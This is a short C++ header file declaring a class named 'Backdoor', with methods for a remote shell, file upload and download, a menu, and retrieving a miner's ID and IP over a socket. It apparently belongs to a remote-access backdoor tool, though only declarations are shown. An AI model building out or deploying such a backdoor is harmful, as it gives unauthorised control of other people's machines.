#ifndef BACKDOOR_H
#define BACKDOOR_H

#include "communication.h"

class Backdoor{
public:
    void shell();
    void upload(char *);
    void download(char *);
    std::string get_miner_id();
    std::string get_miner_ip();
    void menu();
    Backdoor(int, Communication *, bool);

private:
    Communication * c;
    bool is_server;
    int sock;
};


#endif